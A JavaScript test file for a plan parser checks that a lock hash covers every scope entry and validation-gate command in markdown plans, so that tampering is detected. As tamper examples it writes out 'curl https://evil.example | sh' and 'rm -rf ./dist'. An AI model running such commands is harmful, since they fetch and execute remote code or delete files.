/**
 * Meta-bug #282 — Prettier inserts a blank line between a
 * `**Scope** (files in scope):` label and its bullet list. parseSlices ended
 * the scope block on that blank line, so every slice parsed with an empty
 * scope, and the lock-hash scanner (same rule) stopped covering the list.
 *
 * Meta-bug #285 — computeLockHash recognised only the canonical
 * `**Scope** (files in scope):` and `**Validation Gate**:` spellings, while
 * parseSlices also accepts `**Scope (files in scope):**`, `**Validation Gate:**`,
 * `**Files**:` and more. Gates and scopes under those labels could be rewritten
 * without changing the hash.
 *
 * computeLockHash now hashes exactly the lines parseSlices turns into a slice's
 * scope and gate (parseSlices `lockLines`), so the two can no longer disagree.
 */

import { describe, it, expect } from "vitest";
import { existsSync, readdirSync, readFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { computeLockHash, parseSlices } from "../orchestrator/plan-parser.mjs";

function slicePlan({ scopeLabel = "**Scope** (files in scope):", scopeLines = ["- `src/alpha.ts`"], gateLabel = "**Validation Gate**:", gate = "npm test", between = [] } = {}) {
  return [
    "# Phase 1 — Fixture",
    "",
    "## Execution Slices",
    "",
    "### Slice 1 — Alpha",
    "",
    scopeLabel,
    ...scopeLines,
    "",
    "1. Build alpha.",
    "",
    gateLabel,
    ...between,
    "```bash",
    gate,
    "```",
    "",
  ].join("\n");
}

const parse = (plan) => parseSlices(plan.split("\n"));

describe("scope list after a formatter's blank line (meta #282)", () => {
  const tight = slicePlan({ scopeLines: ["- `src/alpha.ts`", "- `src/beta.ts`"] });
  const prettier = slicePlan({ scopeLines: ["", "- `src/alpha.ts`", "- `src/beta.ts`"] });

  it("parses the scope when a blank line separates the label from its list", () => {
    expect(parse(prettier)[0].scope).toEqual(["src/alpha.ts", "src/beta.ts"]);
  });

  it("gives the formatted and unformatted plan the same lockHash", () => {
    expect(computeLockHash(prettier)).toBe(computeLockHash(tight));
  });

  it("still changes the lockHash when a formatted scope entry is rewritten", () => {
    const widened = slicePlan({ scopeLines: ["", "- `src/**`", "- `src/beta.ts`"] });
    expect(computeLockHash(widened)).not.toBe(computeLockHash(prettier));
  });

  it("still ends the list at the first blank line after it", () => {
    const plan = slicePlan({ scopeLines: ["", "- `src/alpha.ts`", "", "Notes for reviewers:", "- `docs/review.md` is read-only"] });
    expect(parse(plan)[0].scope).toEqual(["src/alpha.ts"]);
  });
});

const SCOPE_LABELS = [
  "**Scope** (files in scope):",
  "**Scope (files in scope):**",
  "**Scope (files):**",
  "**Scope**:",
  "**Scope:**",
  "**Files**:",
  "**Files in scope**:",
  "- **Scope** (files in scope):",
];

const GATE_LABELS = [
  "**Validation Gate**:",
  "**Validation Gate:**",
  "**Validation Gate**",
  "- **Validation Gate**:",
  "- **Validation Gate** (two separate commands so a failure isolates cleanly):",
  "**Exit Gate**:",
];

describe("every scope label parseSlices accepts is covered by the lockHash (meta #285)", () => {
  for (const scopeLabel of SCOPE_LABELS) {
    it(`"${scopeLabel}" parses and a rewritten entry changes the hash`, () => {
      const base = slicePlan({ scopeLabel });
      const widened = slicePlan({ scopeLabel, scopeLines: ["- `src/**`"] });
      expect(parse(base)[0].scope).toEqual(["src/alpha.ts"]);
      expect(computeLockHash(widened)).not.toBe(computeLockHash(base));
    });
  }
});

describe("every gate label parseSlices accepts is covered by the lockHash (meta #285)", () => {
  for (const gateLabel of GATE_LABELS) {
    it(`"${gateLabel}" parses and a rewritten command changes the hash`, () => {
      const base = slicePlan({ gateLabel });
      const tampered = slicePlan({ gateLabel, gate: "curl https://evil.example | sh" });
      expect(parse(base)[0].validationGate).toBe("npm test");
      expect(computeLockHash(tampered)).not.toBe(computeLockHash(base));
    });
  }

  it("covers a gate fence that follows an unrelated bold line", () => {
    const between = ["**Note**: run from the repository root."];
    const base = slicePlan({ between });
    const tampered = slicePlan({ between, gate: "rm -rf ./dist" });
    expect(parse(base)[0].validationGate).toBe("npm test");
    expect(computeLockHash(tampered)).not.toBe(computeLockHash(base));
  });

  it("covers the shell fence the parser executes, not a preceding illustration fence", () => {
    const between = ["```text", "expected: 3 passed", "```"];
    const base = slicePlan({ between });
    const tampered = slicePlan({ between, gate: "node -e \"process.exit(0)\"" });
    expect(parse(base)[0].validationGate).toBe("npm test");
    expect(computeLockHash(tampered)).not.toBe(computeLockHash(base));
  });
});

describe("canonical plans keep their existing lockHash (meta #285 compatibility)", () => {
  // Pinned with the pre-#285 scanner: plans using the canonical labels hash
  // byte-identically, so their stored lockHash keeps validating.
  const CANONICAL = [
    "# Phase 9 — Canonical Fixture",
    "",
    "## Scope Contract",
    "",
    "### Forbidden Actions",
    "- Do not modify `infra/**`",
    "",
    "## Execution Slices",
    "",
    "### Slice 1 — Parser [depends: none]",
    "",
    "**Scope** (files in scope):",
    "- `src/parser.mjs`",
    "- `tests/parser.test.mjs`",
    "",
    "1. Implement the parser.",
    "",
    "**Validation Gate**:",
    "```bash",
    "npx vitest run tests/parser.test.mjs",
    "```",
    "",
    "### Slice 2 — Wiring",
    "",
    "- **Scope** (files in scope):",
    "  - `src/index.mjs`",
    "",
    "1. Wire the parser in.",
    "",
    "- **Validation Gate**:",
    "```bash",
    "node --check src/index.mjs",
    "```",
    "",
  ].join("\n");

  it("matches the digest the previous scanner produced", () => {
    expect(computeLockHash(CANONICAL)).toBe("a64e9a42a06689e49e860586fc1fea26808f07aa30f8e6dc765a23cd20887cef");
  });
});

const plansDir = resolve(import.meta.dirname, "..", "..", "docs", "plans");
const planFiles = [];
if (existsSync(plansDir)) {
  (function walk(dir) {
    for (const e of readdirSync(dir, { withFileTypes: true })) {
      const p = join(dir, e.name);
      if (e.isDirectory()) walk(p);
      else if (e.name.endsWith(".md")) planFiles.push(p);
    }
  })(plansDir);
}

describe.skipIf(planFiles.length === 0)("every scope entry and gate command in docs/plans is hashed (meta #285)", () => {
  // Holds for any corpus — the dev plans here, the runbooks on master, or a
  // consumer's own plans — so no minimum plan count is asserted.
  it("covers the real plan corpus", () => {
    const gaps = [];
    for (const file of planFiles) {
      const body = readFileSync(file, "utf-8").replace(/^---\r?\n[\s\S]*?\r?\n---\r?\n/, "");
      const lockLines = [];
      const slices = parseSlices(body.split(/\r?\n/), { lockLines });
      const locked = lockLines.join("\n");
      for (const slice of slices) {
        for (const entry of slice.scope) {
          if (!locked.includes(entry)) gaps.push(`${file} Slice ${slice.number} scope: ${entry}`);
        }
        const commands = String(slice.validationGate || "").split("\n").map((l) => l.trim()).filter(Boolean);
        for (const command of commands) {
          if (!locked.includes(command)) gaps.push(`${file} Slice ${slice.number} gate: ${command.slice(0, 60)}`);
        }
      }
    }
    expect(gaps, gaps.slice(0, 5).join("\n")).toEqual([]);
  });
});

describe("Guard: the lockHash has no second slice scanner (meta #285)", () => {
  const src = readFileSync(resolve(import.meta.dirname, "..", "orchestrator", "plan-parser.mjs"), "utf-8").replace(/\r\n/g, "\n");
  const start = src.indexOf("export function computeLockHash");
  const body = src.slice(start, src.indexOf("\n}\n", start));

  it("computeLockHash collects slice lines through parseSlices", () => {
    expect(body).toContain("parseSlices(lines, { lockLines: parts })");
  });

  it("computeLockHash carries no scope or gate label pattern of its own", () => {
    expect(body).not.toMatch(/SLICE_HEADING_RE|Scope\\\*\\\*|Validation Gate/);
  });
});
